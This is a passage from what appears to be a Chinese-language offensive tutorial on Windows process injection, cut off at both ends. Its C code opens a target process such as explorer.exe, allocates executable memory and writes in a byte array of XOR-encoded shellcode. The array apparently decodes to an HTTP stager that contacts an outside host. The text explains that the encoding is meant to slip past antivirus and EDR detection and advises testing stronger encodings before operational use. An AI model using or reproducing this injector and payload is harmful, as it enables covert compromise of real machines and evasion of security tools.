       int process_id = atoi(argv[1]);
      // Declare a new handle as process variable
      // PROCESS_ALL_ACCESS
      HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
      // If the operation succeeded it will return the handle
      if(process){
        printf("[+] Handle retrieved successfully!\n");
        // We can print it as pointer using printf
        printf("[+] Handle value is %p\n", process);
        // Allocate space
        // Define the base_address variable which will save the allocated memory address
        LPVOID base_address;
        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(base_address){
            printf("[+] Allocated based address is 0x%x\n", base_address);
        }else{
            printf("[-] Unable to allocate memory ...\n");
        }
      }else{
        printf("[-] Unable to retrieve process handle\n");
      }
    }
我在第7行中添加了一些数据作为转储数据（将被我们的shellcode替换），我们应该让它根据其大小分配内存。
在第25行中，我们将名为“ base_address”的变量声明为LPVOID，它将代表分配的内存的基址。
在第26行中，我们使用VirtualAllocEx（）并为其传递以下参数：
    1. process：这是我们之前使用OpenProcess（）检索到的句柄
    2. Null：确保该函数将自动分配地址，而不是使用我们已知的地址。
    3. sizeof（data）：将写入内存的数据大小。
    4. MEM_COMMIT | MEM_RESERVE，PAGE_EXECUTE_READWRITE：我们要使用的分配类型，它描述我们要在该分配的内存区域内执行的操作，该区域是读写执行（RWX）
注意，用RWX分配内存区域不是很隐秘，EDR可以将其视为可疑操作。
最后，在第29行中，我们将打印分配的内存的地址，并将其写入数据，并通过运行代码获得以下内容：
我们将地址“ 0xa50000”作为我们的基地址。
让我进一步解释一下，并告诉您该地址的确切含义。我们将调试器附加到explorer.exe，然后查看该地址的内容：
然后，我将转到地址“ 0xa50000”：
选择表达式并输入地址：
得到以下结果：
如我们所见，函数VirtualAllocEx已为我们在explorer.exe中分配了内存空间，我们准备写入数据。
## 将数据写入内存
现在，这是我们技术中最重要的部分，我们将解码原始操作码并将其直接写入内存，我们将通过从“
0xA50000”开始写入数据并将地址一一增加到下一个内存地址来做到这一点。
我们使用xor编码我们的shellcode，现在我们将使用相同的值来解码每个字节并检索每个操作码的原始状态，这是有关此操作的一个示例：
    hex(ord("\xfc") ^ 0x01) # = 0xfd
    hex(ord"\xfd") ^ 0x01) # = 0xfc
因此，通过将每个操作码与0x01进行XOR运算，我们将检索原始的shellcode，但这一次不会被AV /
EDR进行的静态分析（基于签名）检测所捕获，因为它将在运行时直接写入内存。
即使使用这种类型的编码，您的有效负载也可能会被标记，因此请确保在操作中使用之前使用更强的编码并对其进行测试。
具体代码实现如下：
    #include 
    int main(int argc, char *argv[]){
       unsigned char data[] = "\xfd\x49\x82\xe5\xf1\xe9\xc9\x1\x1\x1\x40\x50\x40\x51\x53\x50\x57\x49\x30\xd3\x64\x49\x8a\x53\x61\x49\x8a\x53\x19\x49\x8a\x53\x21\x49\x8a\x73\x51\x49\xe\xb6\x4b\x4b\x4c\x30\xc8\x49\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\x40\xc0\xc8\xc\x40\x0\xc0\xe3\xec\x53\x40\x50\x49\x8a\x53\x21\x8a\x43\x3d\x49\x0\xd1\x67\x80\x79\x19\xa\x3\x74\x73\x8a\x81\x89\x1\x1\x1\x49\x84\xc1\x75\x66\x49\x0\xd1\x51\x8a\x49\x19\x45\x8a\x41\x21\x48\x0\xd1\xe2\x57\x49\xfe\xc8\x40\x8a\x35\x89\x49\x0\xd7\x4c\x30\xc8\x49\x30\xc1\xad\x40\xc0\xc8\xc\x40\x0\xc0\x39\xe1\x74\xf0\x4d\x2\x4d\x25\x9\x44\x38\xd0\x74\xd9\x59\x45\x8a\x41\x25\x48\x0\xd1\x67\x40\x8a\xd\x49\x45\x8a\x41\x1d\x48\x0\xd1\x40\x8a\x5\x89\x49\x0\xd1\x40\x59\x40\x59\x5f\x58\x5b\x40\x59\x40\x58\x40\x5b\x49\x82\xed\x21\x40\x53\xfe\xe1\x59\x40\x58\x5b\x49\x8a\x13\xe8\x4e\xfe\xfe\xfe\x5c\x6b\x1\x48\xbf\x76\x68\x6f\x68\x6f\x64\x75\x1\x40\x57\x48\x88\xe7\x4d\x88\xf0\x40\xbb\x4d\x76\x27\x6\xfe\xd4\x49\x30\xc8\x49\x30\xd3\x4c\x30\xc1\x4c\x30\xc8\x40\x51\x40\x51\x40\xbb\x3b\x57\x78\xa6\xfe\xd4\xea\x72\x5b\x49\x88\xc0\x40\xb9\x57\x1e\x1\x1\x4c\x30\xc8\x40\x50\x40\x50\x6b\x2\x40\x50\x40\xbb\x56\x88\x9e\xc7\xfe\xd4\xea\x58\x5a\x49\x88\xc0\x49\x30\xd3\x48\x88\xd9\x4c\x30\xc8\x53\x69\x1\x3\x41\x85\x53\x53\x40\xbb\xea\x54\x2f\x3a\xfe\xd4\x49\x88\xc7\x49\x82\xc2\x51\x6b\xb\x5e\x49\x88\xf0\x49\x88\xdb\x48\xc6\xc1\xfe\xfe\xfe\xfe\x4c\x30\xc8\x53\x53\x40\xbb\x2c\x7\x19\x7a\xfe\xd4\x84\xc1\xe\x84\x9c\x0\x1\x1\x49\xfe\xce\xe\x85\x8d\x0\x1\x1\xea\xd2\xe8\xe5\x0\x1\x1\xe9\xa3\xfe\xfe\xfe\x2e\x34\x6f\x6a\x4e\x1\x2\x9b\xf5\xba\xe1\xdc\x3f\x6d\x86\xa4\x4\x4a\x83\x50\x2e\xd4\x69\x66\x14\xd7\xfc\x11\xf2\xa4\x91\x61\xeb\xbb\xff\x1e\x27\x2c\x5\xf2\xed\xca\xd5\x72\x95\x56\x99\x5f\xdf\xed\xb9\x3f\xd8\x4f\x33\xcd\x39\xe2\x95\x7\x1c\x72\x2c\xb2\xd5\x63\x27\xcb\x5b\xaf\x53\xee\xf5\xc1\x80\x76\x96\xcf\xd4\x1\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x35\x2f\x31\x21\x29\x62\x6e\x6c\x71\x60\x75\x68\x63\x6d\x64\x3a\x21\x4c\x52\x48\x44\x21\x39\x2f\x31\x3a\x21\x56\x68\x6f\x65\x6e\x76\x72\x21\x4f\x55\x21\x34\x2f\x30\x3a\x21\x55\x73\x68\x65\x64\x6f\x75\x2e\x35\x2f\x31\x3a\x21\x46\x55\x43\x36\x2f\x35\x3a\x21\x48\x6f\x67\x6e\x51\x60\x75\x69\x2f\x33\x28\xc\xb\x1\x60\xe3\x48\x6d\xb4\x30\x93\x21\x18\xc8\xab\x68\x2a\xbd\xc0\x8a\x29\xf8\x81\x6d\x93\xad\xbb\xeb\x7\x33\x4\xc3\x39\x1a\xe\x3f\x84\x38\xc2\x8b\x13\x20\xe6\x50\x81\x81\x31\x3\xe6\xcd\x8e\x35\x39\xd0\xe3\x49\xf1\x29\x20\xe8\xd6\xa7\x46\x59\xf\x49\x8d\x1c\x17\xac\x7c\xac\xbc\xa5\x41\x59\x4a\x5e\x3c\xa8\xd1\x54\x18\xde\x42\xf0\x68\xbb\xd\x80\x6e\x90\x73\x95\xc7\x64\xb5\x8c\x5a\x5\x59\x69\x73\x92\xc2\xbd\x47\x10\xa\xf9\x51\x27\x53\x14\x48\xda\x37\xc\x74\x5c\x80\x5c\x46\x1a\xe\x5f\x24\x51\x35\x22\xc0\x68\xfc\x23\x74\x5c\xeb\xa5\x2f\x41\x99\x13\x73\x8f\xd5\xdf\xee\xf3\x43\xdc\x9\x6a\xa2\x75\x12\x6d\xa8\x83\xfd\x24\xed\xe7\x23\xeb\x9a\x4a\x59\xa9\x84\x66\xa0\x79\x1f\xab\x6\x30\xd6\xce\x4b\x75\xf0\x31\x62\x3f\xf\x5d\x16\x52\x2e\x68\x66\x93\xf9\x29\xff\xd7\x6e\xcf\x7\xc4\xdc\xb3\xc\x70\xf5\xdb\x19\x5f\x27\x1\x40\xbf\xf1\xb4\xa3\x57\xfe\xd4\x49\x30\xc8\xbb\x1\x1\x41\x1\x40\xb9\x1\x11\x1\x1\x40\xb8\x41\x1\x1\x1\x40\xbb\x59\xa5\x52\xe4\xfe\xd4\x49\x92\x52\x52\x49\x88\xe6\x49\x88\xf0\x49\x88\xdb\x40\xb9\x1\x21\x1\x1\x48\x88\xf8\x40\xbb\x13\x97\x88\xe3\xfe\xd4\x49\x82\xc5\x21\x84\xc1\x75\xb7\x67\x8a\x6\x49\x0\xc2\x84\xc1\x74\xd6\x59\x59\x59\x49\x4\x1\x1\x1\x1\x51\xc2\xe9\x9e\xfc\xfe\xfe\x30\x31\x2f\x31\x2f\x31\x2f\x30\x1\x59\x57\x3c\xd3";
      // The PID that you want to use
       int process_id = atoi(argv[1]);
      // Declare a new handle as process variable
      // PROCESS_ALL_ACCESS
      HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
      // If the operation succeeded it will return the handle
      if(process){
        printf("[+] Handle retrieved successfully!\n");
        // We can print it as pointer using printf
        printf("[+] Handle value is %p\n", process);
        // Allocate space
        // Define the base_address variable which will save the allocated memory address
        LPVOID base_address;
        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(base_address){
            printf("[+] Allocated based address is 0x%x\n", base_address);
                            // Data chars counter
                    int i;
                    // Base address counter
                    int n = 0;
                    for(i = 0; i<=sizeof(data); i++){
                        // Decode shellcode opcode
                        char DecodedOpCode = data[i] ^ 0x01;
                        // Write the decoded bytes in memory address
                        if(WriteProcessMemory(process, base_address+n, &DecodedOpCode, 1, NULL)){
                            printf("[+] Byte wrote sucessfully!\n");
                            // Increase memory address by 1
                            n++;